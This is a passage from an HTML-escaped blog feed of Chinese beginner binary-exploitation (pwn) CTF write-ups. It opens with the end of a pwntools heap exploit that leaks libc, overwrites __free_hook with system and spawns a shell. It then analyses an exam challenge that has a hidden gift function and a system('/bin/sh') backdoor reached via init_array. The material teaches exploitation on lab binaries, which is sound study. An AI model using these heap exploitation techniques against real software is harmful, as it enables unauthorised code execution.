class=&#34;number&#34;&gt;0x80&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;d&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;e&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    alloc(i,&lt;span class=&#34;number&#34;&gt;0x88&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;p&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;17&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;24&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free(i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 让2  free到unsortedbin里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 与之前残留的0x110一起合并 注意这个3的位置  0x90+0x110 =0x1a0 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\xa0&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;# 这里也很关键,再次释放5,5又与前面的2组合为&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leak_libc = u64(p.recv(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;).ljust(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(leak_libc))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc_base = leak_libc - &lt;span class=&#34;number&#34;&gt;0x00007f74b3a5cca0&lt;/span&gt; + &lt;span class=&#34;number&#34;&gt;0x7f74b3671000&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;0x200&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_hook = libc_base + libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;__free_hook&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libc_base + libc.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;edit(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0xa0&lt;/span&gt;,p8(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) * &lt;span class=&#34;number&#34;&gt;0x80&lt;/span&gt; + p64(&lt;span class=&#34;number&#34;&gt;0x90&lt;/span&gt;) + p64(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;) + p64(free_hook))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;alloc(&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;,p64(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#log.success(hex(libc_base))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#pause()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&#34;问题&#34;&gt;&lt;a href=&#34;#问题&#34; class=&#34;headerlink&#34; title=&#34;问题&#34;&gt;&lt;/a&gt;问题&lt;/h1&gt;&lt;p&gt;libc.symbols 覆盖的到底是什么呢?&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-06-03T08:04:02.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/</id>
        <title>pwn入门-28-高级网络攻防考试一题</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/"/>
        <content type="html">&lt;p&gt;​		在考试的时候没有做出来,考完后和老曹交流学会了,主要卡住的点,是走错了方向,一直在考虑堆的漏洞怎么利用,其实不是堆的漏洞,怎么说呢,其实是一个知识点的事,init_array这个节,会进行一些初始化操作,不知道确实很难搞…不过其实也不是没有办法,其实可以进行一些全局搜索之类的,寻找线索.&lt;/p&gt;
&lt;p&gt;​		题目文件: 本链接加attachments.tar.gz&lt;/p&gt;
&lt;h1 id=&#34;解题思路&#34;&gt;&lt;a href=&#34;#解题思路&#34; class=&#34;headerlink&#34; title=&#34;解题思路&#34;&gt;&lt;/a&gt;解题思路&lt;/h1&gt;&lt;h2 id=&#34;寻找对应函数&#34;&gt;&lt;a href=&#34;#寻找对应函数&#34; class=&#34;headerlink&#34; title=&#34;寻找对应函数&#34;&gt;&lt;/a&gt;寻找对应函数&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a2, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **a3)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// [rsp+14h] [rbp-Ch] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v5; &lt;span class=&#34;comment&#34;&gt;// [rsp+18h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v5 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (__fastcall *)(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **, &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **))sub_14A9)(a1, a2, a3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (__fastcall *)(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *))sub_1531)(a1);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;choice: &amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a1 = &lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    __isoc99_scanf(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 == &lt;span class=&#34;number&#34;&gt;4&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v4 &amp;lt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*)(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *, ...))((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)*(&amp;amp;off_5000 + v4 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0xDEADBEEF&lt;/span&gt;LL))(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_1531&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;1. add&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;2. delete&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;3. edit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;4. exit&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v1 - __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		一上来看sub_1531是能看到菜单的,但是很明显,下面没有对应的函数,就感到很奇怪了,(&lt;font color=&#34;red&#34;&gt;其实下次可以直接在ida的函数列表里找,如果不是花指令的话,花指令的话,还是直接看汇编,看有没有红色的代码&lt;/font&gt;)&lt;/p&gt;
&lt;p&gt;​		当时是在gdb中动态调试找到的对应的函数&lt;/p&gt;
&lt;p&gt;​		同时发现了一个gift函数,用来泄露地址的,还发现了一个后门函数,可以直接getshell,于是现在的问题就变成了怎么执行这个后门函数呢? 也就是怎么劫持控制流, 覆盖返回地址 or 利用堆进行任意内存读写, 似乎 都不太行…于是就卡住了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_1206&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *v0; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v2; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Ok, you find the gift&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v0 = &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%#lx, %#lx, %#lx\n&amp;quot;&lt;/span&gt;, sub_1206, &amp;amp;write, v0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v2 - __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 &lt;span class=&#34;title function_&#34;&gt;sub_11C9&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-8h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v1 - __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;柳暗花明差一村&#34;&gt;&lt;a href=&#34;#柳暗花明差一村&#34; class=&#34;headerlink&#34; title=&#34;柳暗花明差一村&#34;&gt;&lt;/a&gt;柳暗花明差一村&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;  ((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; (*)(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *, ...))((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *)*(&amp;amp;off_5000 + v4 - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;0xDEADBEEF&lt;/span&gt;LL))(&lt;span class=&#34;string&#34;&gt;&amp;quot;%d&amp;quot;&lt;/span&gt;, &amp;amp;v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data:&lt;span class=&#34;number&#34;&gt;0000000000005000&lt;/span&gt; off_5000        dq &lt;span class=&#34;number&#34;&gt;0F&lt;/span&gt;FFFFFFF21525389h   ; DATA XREF: main+A0↑o&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data:&lt;span class=&#34;number&#34;&gt;0000000000005008&lt;/span&gt;                 dq &lt;span class=&#34;number&#34;&gt;0F&lt;/span&gt;FFFFFFF21525477h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.data:&lt;span class=&#34;number&#34;&gt;0000000000005010&lt;/span&gt;                 dq &lt;span class=&#34;number&#34;&gt;0F&lt;/span&gt;FFFFFFF21525518h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		当时在main函数中,看到了这个,也理解了off_5000是data节中的数据,利用这里的数据进行一些运算,然后就到达了函数地址,例如0位置,运算后就是add函数的位置,但是 gift和后门函数,都在内存中没有这个偏移,堆虽然可以写,但是不知道堆的地址呀,但gift可以泄露,但gift怎么调用呢??  于是就卡死了………&lt;/p&gt;
&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;其实这里可以尝试爆破的…(我觉得),后面有时间可以试试&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		于是就在这里卡死了…就像开头提的一样,其实在init_array中有初始化这个操作,保存了gift对应的地址,怎么说呢…应该让自己多学一点工具,辅助自己去探索可能的路径&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-28-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E8%80%83%E8%AF%95%E4%B8%80%E9%A2%98/image-20230602223110772.png&#34; alt=&#34;image-20230602223110772&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;正解&#34;&gt;&lt;a href=&#34;#正解&#34; class=&#34;headerlink&#34; title=&#34;正解&#34;&gt;&lt;/a&gt;正解&lt;/h2&gt;&lt;p&gt;​		elf执行时会先走这个init,这里面有个sub_144E,就是它把gift函数加载进去了,能够看到,它加载到的地址的偏移就是0x29C0&lt;/p&gt;
&lt;p&gt;&amp;amp;0xFFFFFFFFFFFFF000LL是干了啥呢? 与之后就是程序0x5000的位置,是为了得到这个位置,然后+0x29C0就是存储gift的地方&lt;/p&gt;
&lt;p&gt;​		不过这里为啥是0xDEADBF61LL,这是什么逻辑,后面在main中要+0xDEADBEEFLL,&lt;/p&gt;
&lt;p&gt;​		所以0x1278 - 0xDEADBF61 +0xDEADBEEF &amp;#x3D; 0x1206,就是gift的地址,所以这个地址应该是这个原因,因为要考虑到pie,所以要用一个函数或者变量的地址,这里用了0x1278的, 和它差多少呢?  就是  0x1206  -  0xDEADBEEF-0x1278,也就是-0xdeadbf61&lt;/p&gt;
